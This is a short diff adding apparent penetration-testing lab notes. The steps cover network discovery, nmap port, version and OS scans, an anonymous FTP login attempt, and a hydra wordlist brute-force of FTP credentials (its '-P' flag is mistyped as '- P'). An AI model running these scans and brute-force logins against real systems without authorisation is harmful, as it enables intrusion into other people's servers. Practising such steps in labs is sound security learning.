@@ -1,0 +1,8 @@
+1 - Check IP on https://dnschecker.org/all-dns-records-of-domain.php
+2 - On Kali Linux:
+	a - netdiscover -r (IP)
+	b - nmap -sS -p- (Machine's IP)
+	c - nmap -sS -sV -O (Machine's IP)
+	d - ftp (Machine's IP) {Name='anonymous', Password=''}
+	e - hydra -L /root/Desktop/Users.txt - P /root/Desktop/Passwords.txt (Machine's IP) (target server, like 'ftp') -v
+	f - ftp (Machine's IP) {Name=found login, Password=found password}
